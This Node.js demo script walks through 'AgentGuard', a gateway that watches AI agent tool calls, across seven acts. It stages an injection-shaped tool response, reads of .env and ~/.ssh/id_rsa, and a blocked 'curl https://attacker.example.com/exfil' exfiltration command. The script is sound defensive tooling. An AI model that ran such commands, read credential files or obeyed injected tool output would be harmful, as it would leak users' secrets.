#!/usr/bin/env node
// AgentGuard DevDay demo — the 7-Act narrative documented in
// docs/DEV-DAY-DEMO.md: Problem -> Discover -> Normal activity ->
// Suspicious response -> Sensitive resource -> Blocked execution ->
// Correlation.
//
// Everything here is real code actually running, not simulated output:
// the MCP server is test/fixtures/fake-mcp-server.js (never touches the
// real filesystem or network), and Act 6's "curl" never actually runs —
// AgentGuard blocks it before ever calling spawn(). Safe to run repeatedly:
// all state lives in os.tmpdir() under a timestamped name and is deleted
// at the end.
import { spawn } from 'node:child_process';
import path from 'node:path';
import readline from 'node:readline';
import fs from 'node:fs';
import os from 'node:os';
import { fileURLToPath } from 'node:url';

import { runScanCommand } from '../src/cli/scan-command.js';
import { runEventsCommand } from '../src/cli/events-command.js';
import { runExecCommand } from '../src/cli/exec-command.js';
import { bold } from '../src/core/colors.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, '..');
const CLI = path.join(repoRoot, 'bin', 'agentguard.js');
const FIXTURE_SERVER = path.join(repoRoot, 'test', 'fixtures', 'fake-mcp-server.js');
const POLICY = path.join(repoRoot, 'examples', 'demo-policy.yaml');
const CHAIN_LOG = path.join(os.tmpdir(), `agentguard-demo-chain-${Date.now()}.jsonl`);

function act(number, title, bodyLines = []) {
  console.log('\n' + '='.repeat(64));
  console.log(bold(`ACT ${number} — ${title}`));
  console.log('='.repeat(64));
  for (const line of bodyLines) console.log(line);
}

let id = 0;
function call(name, args) {
  return { jsonrpc: '2.0', id: ++id, method: 'tools/call', params: { name, arguments: args } };
}

/** Sends one request through an already-spawned gateway and waits for its
 * matching response. The gateway's own human-readable decision output
 * (ALLOW/WARN/BLOCK + risk + reason) prints live via piped stderr — this
 * is the real AgentGuard output, not a re-narration of it.
 *
 * The stdout response and the stderr decision lines are two independent
 * streams from the same child process; the stdout response can resolve
 * slightly before its own stderr lines finish arriving through the pipe.
 * A short pause after each request keeps the narration in the order it
 * actually happened instead of racing the next request's output against
 * the tail of this one's — determinism matters more than 100ms here. */
async function sendAndWait(gw, pending, req) {
  const result = await new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('timed out')), 5000);
    pending.set(req.id, (msg) => {
      clearTimeout(timer);
      resolve(msg);
    });
    gw.stdin.write(JSON.stringify(req) + '\n');
  });
  await new Promise((r) => setTimeout(r, 120));
  return result;
}

// ---------------------------------------------------------------------
act(
  1,
  'The Problem',
  [
    'AI agents are increasingly running on developer machines.',
    'Those machines contain: source code, credentials, cloud configuration,',
    'access to internal tools, and MCP servers.',
    '',
    'Question: what happens when an agent does something it shouldn\'t?',
  ]
);
await new Promise((r) => setTimeout(r, 400));

// ---------------------------------------------------------------------
act(2, 'Discover (agentguard scan)', ['Posture = what COULD happen, before any agent runs.', '']);
await runScanCommand([]);

// ---------------------------------------------------------------------
// Acts 3-5 share ONE gateway session (one spawn, one sessionId) so the
// correlation engine in Act 7 can see the whole sequence.
const gw = spawn(
  process.execPath,
  [CLI, 'gateway', '--policy', POLICY, '--log', CHAIN_LOG, '--server-name', 'trusted-server', '--', process.execPath, FIXTURE_SERVER],
  { stdio: ['pipe', 'pipe', 'pipe'] }
);
// Forward through OUR process's own write queue rather than `stdio:
// 'inherit'` — inheriting a raw OS handle lets a child's stderr writes race
// with the parent's own console.log calls when output isn't a real TTY
// (piped, captured, or redirected), scrambling the narration order. Piping
// keeps everything flowing through one process's output scheduling.
gw.stderr.pipe(process.stderr);
const pending = new Map();
const rl = readline.createInterface({ input: gw.stdout });
rl.on('line', (line) => {
  if (!line.trim()) return;
  const msg = JSON.parse(line);
  pending.get(msg.id)?.(msg);
});

act(3, 'Normal Agent Activity', ['AgentGuard does not simply block agents — it allows legitimate work.', '']);
await sendAndWait(gw, pending, call('read_file', { path: './README.md' }));

act(
  4,
  'Suspicious Response',
  [
    'The (fixture) MCP server returns a response containing an',
    'instruction-injection-SHAPED phrase. AgentGuard does not claim to',
    'detect prompt injection itself — it flags the pattern as a signal.',
    '',
  ]
);
await sendAndWait(gw, pending, call('injected_response', {}));

act(5, 'Sensitive Resource', ['First a soft signal, then a hard boundary.', '']);
await sendAndWait(gw, pending, call('read_file', { path: '.env' }));
const sshResult = await sendAndWait(gw, pending, call('read_file', { path: '~/.ssh/id_rsa' }));
console.log(
  sshResult.error
    ? `\n${bold('BLOCKED')} — the MCP server never received this request.`
    : '\n(unexpected: this should have been BLOCKed)'
);

// sendAndWait's own drain pause already covers this last response too.
gw.kill();

// ---------------------------------------------------------------------
act(
  6,
  'Dangerous Execution (agentguard exec)',
  [
    'The agent falls back to a raw shell command to exfiltrate data.',
    'This is evaluated BEFORE spawn() is ever called — not observed',
    'after the fact.',
    '',
  ]
);
await runExecCommand(['--policy', POLICY, '--log', CHAIN_LOG, '--', 'curl', 'https://attacker.example.com/exfil']);
console.log(
  `\n${bold('BLOCKED')} — process: NOT STARTED (exit code ${process.exitCode ?? 0}, curl was never spawned).`
);
process.exitCode = 0;

// ---------------------------------------------------------------------
act(7, 'Correlation (agentguard events)', ['The full session timeline, plus any detected pattern.', '']);
runEventsCommand(['--log', CHAIN_LOG]);

console.log('\n' + '='.repeat(64));
console.log(bold('A note on scope'));
console.log('='.repeat(64));
console.log(
  [
    'The MCP session above and the agentguard exec call in Act 6 show up',
    'as two SEPARATE sessions — look closely at the session ids. Today',
    'our correlation is session-scoped: MCP and exec have independent',
    'identities, so cross-adapter attribution is intentionally not',
    'claimed. That is a documented limitation, not a bug we\'re hiding —',
    'see README.md and SECURITY-ASSESSMENT.md.',
  ].join('\n')
);

fs.unlinkSync(CHAIN_LOG);
